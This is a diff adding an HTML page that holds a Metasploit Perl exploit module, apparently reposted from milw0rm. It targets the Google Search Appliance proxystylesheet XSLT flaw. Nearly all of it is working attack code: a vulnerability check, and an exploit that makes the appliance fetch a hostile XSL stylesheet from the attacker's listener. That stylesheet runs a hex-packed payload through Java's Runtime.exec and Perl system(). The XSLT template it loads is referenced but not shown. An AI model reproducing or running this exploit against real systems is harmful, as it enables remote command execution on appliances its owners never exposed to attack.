@@ -1,0 +1,263 @@
+<html>
+<head>
+<title>Google Search Appliance proxystylesheet XSLT Java Code Execution</title>
+<pre>
+##
+# This file is part of the Metasploit Framework and may be redistributed
+# according to the licenses defined in the Authors field below. In the
+# case of an unknown or missing license, this file defaults to the same
+# license as the core Framework (dual GPLv2 and Artistic). The latest
+# version of the Framework can always be obtained from metasploit.com.
+##
+
+package Msf::Exploit::google_proxystylesheet_exec;
+
+use strict;
+use base &quot;Msf::Exploit&quot;;
+use Pex::Text;
+use IO::Socket;
+use IO::Select;
+my $advanced = { };
+
+my $info =
+{
+	'Name'           =&gt; 'Google Appliance ProxyStyleSheet Command Execution',
+	'Version'        =&gt; '$Revision: 1.1 $',
+	'Authors'        =&gt; [ 'H D Moore &lt;hdm [at] metasploit.com&gt;' ],
+	
+	'Description'    =&gt; 
+		Pex::Text::Freeform(qq{
+			This module exploits a feature in the Saxon XSLT parser used by
+		the Google Search Appliance. This feature allows for arbitrary
+		java methods to be called. Google released a patch and advisory to 
+		their client base in August of 2005 (GA-2005-08-m). The target appliance
+		must be able to connect back to your machine for this exploit to work.
+		}),
+		
+	'Arch'           =&gt; [ ],
+	'OS'             =&gt; [ ],
+	'Priv'           =&gt; 0,
+	'UserOpts'       =&gt; 
+		{
+			'RHOST'    =&gt; [ 1, 'HOST', 'The address of the Google appliance'],
+			'RPORT'    =&gt; [ 1, 'PORT', 'The port used by the search interface', 80],
+			'HTTPPORT' =&gt; [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
+			'HTTPHOST' =&gt; [ 0, 'HOST', 'The local HTTP listener host', &quot;0.0.0.0&quot; ],
+			'HTTPADDR' =&gt; [ 0, 'HOST', 'The address that can be used to connect back to this system'],
+		},
+	'Payload'        =&gt; 
+		{
+			'Space'    =&gt; 1024,
+			'Keys'     =&gt; [ 'cmd' ],
+		},
+	'Refs'           =&gt; 
+		[
+			['OSVDB', 20981],
+		],
+	'DefaultTarget'  =&gt; 0,
+	'Targets'        =&gt;
+		[
+			[ 'Google Search Appliance']
+		],
+	'Keys'           =&gt; [ 'google' ],
+
+	'DisclosureDate' =&gt; 'Aug 16 2005',
+};
+
+sub new
+{
+	my $class = shift;
+	my $self;
+	
+	$self = $class-&gt;SUPER::new(
+			{ 
+				'Info'     =&gt; $info,
+				'Advanced' =&gt; $advanced,
+			},
+			@_);
+
+	return $self;
+}
+
+sub Check {
+	my $self = shift;
+	my $s = $self-&gt;ConnectSearch;
+	
+	if (! $s) {
+		return $self-&gt;CheckCode('Connect');
+	}
+	
+	my $url =
+		&quot;/search?client=&quot;. Pex::Text::AlphaNumText(int(rand(15))+1). &quot;&amp;&quot;.
+		&quot;site=&quot;.Pex::Text::AlphaNumText(int(rand(15))+1).&quot;&amp;&quot;.
+		&quot;output=xml_no_dtd&amp;&quot;.
+		&quot;q=&quot;.Pex::Text::AlphaNumText(int(rand(15))+1).&quot;&amp;&quot;.
+		&quot;proxystylesheet=http://&quot;.Pex::Text::AlphaNumText(int(rand(32))+1).&quot;/&quot;;
+	
+	$s-&gt;Send(&quot;GET $url HTTP/1.0\r\n\r\n&quot;);
+	my $page = $s-&gt;Recv(-1, 5);
+	$s-&gt;Close;
+
+	if ($page =~ /cannot be resolved to an ip address/) {
+		$self-&gt;PrintLine(&quot;[*] This system appears to be vulnerable &gt;:-)&quot;);
+		return $self-&gt;CheckCode('Confirmed');
+	}
+	
+	if ($page =~ /ERROR: Unable to fetch the stylesheet/) {
+		$self-&gt;PrintLine(&quot;[*] This system appears to be patched&quot;);
+	}
+	
+	$self-&gt;PrintLine(&quot;[*] This system does not appear to be vulnerable&quot;);
+	return $self-&gt;CheckCode('Safe');	
+}
+
+
+sub Exploit
+{
+	my $self = shift;
+	my ($s, $page);
+	
+	# Request the index page to obtain a redirect response
+	$s = $self-&gt;ConnectSearch || return;
+	$s-&gt;Send(&quot;GET / HTTP/1.0\r\n\r\n&quot;);
+	$page = $s-&gt;Recv(-1, 5);
+	$s-&gt;Close;
+
+	# Parse the redirect to get the client and site values
+	my ($goog_site, $goog_clnt) = $page =~ m/^location.*site=([^\&amp;]+)\&amp;.*client=([^\&amp;]+)\&amp;/im;
+	if (! $goog_site || ! $goog_clnt) {
+		$self-&gt;PrintLine(&quot;[*] Invalid response to our request, is this a Google appliance?&quot;);
+		#$self-&gt;PrintLine($page);
+		#!!! return;
+		$goog_site = 'test';
+		$goog_clnt = 'test';
+	}
+
+	# Create the listening local socket that will act as our HTTP server
+	my $lis = IO::Socket::INET-&gt;new(
+			LocalHost =&gt; $self-&gt;GetVar('HTTPHOST'),
+			LocalPort =&gt; $self-&gt;GetVar('HTTPPORT'),
+			ReuseAddr =&gt; 1,
+			Listen    =&gt; 1,
+			Proto     =&gt; 'tcp');
+	
+	if (not defined($lis)) {
+		$self-&gt;PrintLine(&quot;[-] Failed to create local HTTP listener on &quot; . $self-&gt;GetVar('HTTPPORT'));
+		return;
+	}
+	my $sel = IO::Select-&gt;new($lis);
+	
+	# Send a search request with our own address in the proxystylesheet parameter
+	my $query = Pex::Text::AlphaNumText(int(rand(32))+1);
+	
+	my $proxy =
+		&quot;http://&quot;.
+		($self-&gt;GetVar('HTTPADDR') || Pex::Utils::SourceIP($self-&gt;GetVar('RHOST'))).
+		&quot;:&quot;.$self-&gt;GetVar('HTTPPORT').&quot;/&quot;.Pex::Text::AlphaNumText(int(rand(15))+1).&quot;.xsl&quot;;
+	
+	my $url = 
+		&quot;/search?client=&quot;. $goog_clnt .&quot;&amp;site=&quot;. $goog_site .
+		&quot;&amp;output=xml_no_dtd&amp;proxystylesheet=&quot;. $proxy .
+		&quot;&amp;q=&quot;. $query .&quot;&amp;proxyreload=1&quot;;
+
+	$self-&gt;PrintLine(&quot;[*] Sending our malicious search request...&quot;);
+	$s = $self-&gt;ConnectSearch || return;
+	$s-&gt;Send(&quot;GET $url HTTP/1.0\r\n\r\n&quot;);
+	$page = $s-&gt;Recv(-1, 3);
+	$s-&gt;Close;
+
+	$self-&gt;PrintLine(&quot;[*] Listening for connections to http://&quot; . $self-&gt;GetVar('HTTPHOST') . &quot;:&quot; . $self-&gt;GetVar('HTTPPORT') . &quot; ...&quot;);
+	
+	# Did we receive a connection?
+	my @r = $sel-&gt;can_read(30);
+	
+	if (! @r) {
+		$self-&gt;PrintLine(&quot;[*] No connection received from the search engine, possibly patched.&quot;);
+		$lis-&gt;close;
+		return;
+	}
+
+	my $c = $lis-&gt;accept();
+	if (! $c) {
+		$self-&gt;PrintLine(&quot;[*] No connection received from the search engine, possibly patched.&quot;);
+		$lis-&gt;close;
+		return;	
+	}
+
+	my $cli = Msf::Socket::Tcp-&gt;new_from_socket($c);
+	$self-&gt;PrintLine(&quot;[*] Connection received from &quot;.$cli-&gt;PeerAddr.&quot;...&quot;);	
+	$self-&gt;ProcessHTTP($cli);
+	return;
+}
+
+sub ConnectSearch {
+	my $self = shift;
+	my $s = Msf::Socket::Tcp-&gt;new(
+		'PeerAddr' =&gt; $self-&gt;GetVar('RHOST'),
+		'PeerPort' =&gt; $self-&gt;GetVar('RPORT'),
+		'SSL'      =&gt; $self-&gt;GetVar('SSL')
+	);
+	
+	if ($s-&gt;IsError) {
+		$self-&gt;PrintLine('[*] Error creating socket: ' . $s-&gt;GetError);
+		return;
+	}
+	return $s;
+}
+
+sub ProcessHTTP
+{
+	my $self = shift;
+	my $cli  = shift;
+	my $targetIdx = $self-&gt;GetVar('TARGET');
+	my $target    = $self-&gt;Targets-&gt;[$targetIdx];
+	my $ret       = $target-&gt;[1];
+	my $shellcode = $self-&gt;GetVar('EncodedPayload')-&gt;Payload;
+	my $content;
+	my $rhost;
+	my $rport;
+
+	# Read the first line of the HTTP request
+	my ($cmd, $url, $proto) = split(/ /, $cli-&gt;RecvLine(10));
+
+	# The way we call Runtime.getRuntime().exec, Java will split
+	# our string on whitespace. Since we are injecting via XSLT,
+	# inserting quotes becomes a huge pain, so we do this...
+	my $exec_str = 
+		'/usr/bin/perl -e system(pack(qq{H*},qq{' .
+		unpack(&quot;H*&quot;, $self-&gt;GetVar('EncodedPayload')-&gt;RawPayload).
+		'}))';
+
+	# Load the template from our data section, we have to manually
+	# seek and reposition to allow the exploit to be used more
+	# than once without a reload.
+	seek(DATA, 0, 0);
+	while(&lt;DATA&gt;) { last if /^__DATA__$/ }
+	while(&lt;DATA&gt;) {	$content .= $_ }
+
+	# Insert our command line
+	$content =~ s/:x:MSF:x:/$exec_str/;
+	
+	# Send it to the requesting appliance
+	$rport = $cli-&gt;PeerPort;
+	$rhost = $cli-&gt;PeerAddr;
+	$self-&gt;PrintLine(&quot;[*] HTTP Client connected from $rhost, sending XSLT...&quot;);
+	
+	my $res = &quot;HTTP/1.1 200 OK\r\n&quot; .
+	          &quot;Content-Type: text/html\r\n&quot; .
+	          &quot;Content-Length: &quot; . length($content) . &quot;\r\n&quot; .
+	          &quot;Connection: close\r\n&quot; .
+	          &quot;\r\n&quot; .
+	          $content;
+
+	$self-&gt;PrintLine(&quot;[*] Sending &quot;.length($res).&quot; bytes...&quot;);
+	$cli-&gt;Send($res);
+	$cli-&gt;Close;
+}
+
+1;
+
+# milw0rm.com [2005-11-20]
+</pre>
+</html>
+
